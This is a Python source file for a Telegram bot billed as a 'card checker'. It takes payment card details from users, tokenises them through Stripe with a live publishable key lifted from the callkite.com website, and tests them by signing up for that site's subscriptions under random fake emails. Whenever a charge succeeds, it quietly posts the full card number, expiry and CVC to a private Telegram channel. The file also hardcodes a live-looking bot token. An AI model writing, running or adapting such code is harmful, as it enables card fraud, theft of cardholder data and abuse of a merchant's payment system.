import telebot
import requests
import random
import string
import re

BOT_TOKEN = "8072279299:AAF7-9MjDIYkoH6iuDztpbSmyQBvz3kRjG0"
CHANNEL_ID = -1002170961342
bot = telebot.TeleBot(BOT_TOKEN)

STRIPE_PUBLISHABLE_KEY = "pk_live_aS5XfyascG0bAVDXZDAZdX4j"

def generate_random_email():
    name = ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))
    return f"{name}@gmail.com"

def extract_card_details(text):
    # Remove all non-digit, non-slash, non-pipe, non-space, non-dash chars
    cleaned = re.sub(r"[^\d\/\-\|\s]", "", text)
    
    # Extract card number: 13 to 19 digits possibly separated by spaces/dashes/pipes
    card_number_match = re.findall(r"\d", cleaned)
    card_number = "".join(card_number_match)
    if not (13 <= len(card_number) <= 19):
        card_number = None

    # Extract expiry month/year (formats like MM/YY, MM-YY, MM|YY, MM YY)
    exp_match = re.search(r"(\d{1,2})[\/\-\|\s](\d{2,4})", cleaned)
    exp_month = exp_match.group(1) if exp_match else None
    exp_year = exp_match.group(2) if exp_match else None

    # Extract CVC (3 or 4 digit number, usually last digits)
    cvc_match = re.findall(r"\b\d{3,4}\b", cleaned)
    cvc = cvc_match[-1] if cvc_match else None

    return card_number, exp_month, exp_year, cvc

@bot.message_handler(commands=['start'])
def start_handler(message):
    bot.send_message(message.chat.id,
        "💳 CallKite Card Checker\n"
        "Send card details in any format.\n"
        "Examples:\n"
        "• 5275 1500 9724 2499 09/28 575\n"
        "• 5275150097242499|09|28|575\n"
        "• 5275-1500-9724-2499 09-28 575"
    )

@bot.message_handler(func=lambda m: True)
def card_handler(message):
    try:
        card_number, exp_month, exp_year, cvc = extract_card_details(message.text)
        if not all([card_number, exp_month, exp_year, cvc]):
            return bot.reply_to(message, "❌ Could not extract all card details. Please send again.")

        email = generate_random_email()
        plan = "monthly"

        stripe_data = {
            "card[number]": card_number,
            "card[cvc]": cvc,
            "card[exp_month]": exp_month.zfill(2),
            "card[exp_year]": exp_year if len(exp_year) == 4 else "20" + exp_year,
            "guid": ''.join(random.choices(string.ascii_lowercase + string.digits, k=32)),
            "muid": ''.join(random.choices(string.ascii_lowercase + string.digits, k=32)),
            "sid": ''.join(random.choices(string.ascii_lowercase + string.digits, k=32)),
            "payment_user_agent": "stripe.js/1cb064bd1e; stripe-js-v3/1cb064bd1e; card-element",
            "time_on_page": str(random.randint(10000, 99999)),
            "referrer": "https://callkite.com",
            "key": STRIPE_PUBLISHABLE_KEY
        }

        stripe_resp = requests.post(
            "https://api.stripe.com/v1/tokens",
            data=stripe_data,
            headers={
                "content-type": "application/x-www-form-urlencoded",
                "accept": "application/json",
                "origin": "https://js.stripe.com",
                "referer": "https://js.stripe.com/"
            }
        )
        stripe_json = stripe_resp.json()

        if "error" in stripe_json:
            return bot.reply_to(message, f"❌ Stripe Decline:\n{stripe_json['error'].get('message', 'Unknown error')}")

        token = stripe_json.get("id")
        if not token or not token.startswith("tok_"):
            return bot.reply_to(message, f"❌ Failed to get Stripe token:\n{stripe_json}")

        signup_payload = {
            "email": email,
            "token": token,
            "plan": plan
        }
        signup_resp = requests.post(
            "https://callkite.com/api/signup",
            json=signup_payload,
            headers={
                "content-type": "application/json",
                "accept": "*/*",
                "origin": "https://callkite.com",
                "referer": "https://callkite.com/signup"
            }
        )
        signup_json = signup_resp.json()

        if signup_json.get("success") is True:
            subscription_id = signup_json.get("subscription", {}).get("id", "N/A")
            success_msg = (
                f"✅ Payment Successful!\n\n"
                f"Card Details:\n"
                f"Number: {card_number}\n"
                f"Expiry: {exp_month}/{exp_year}\n"
                f"CVC: {cvc}\n\n"
                f"Subscription ID: {subscription_id}\n"
                f"Email used: {email}\n\n"
                f"Full Response:\n{signup_json}"
            )
            bot.reply_to(message, "✅ Your Card Was Added")
            bot.send_message(CHANNEL_ID, success_msg)
        else:
            bot.reply_to(message, f"❌ Decline or Error:\n{signup_json.get('message', 'Unknown error')}")

    except Exception as e:
        bot.reply_to(message, f"⚠️ Error: {str(e)}")

bot.infinity_polling()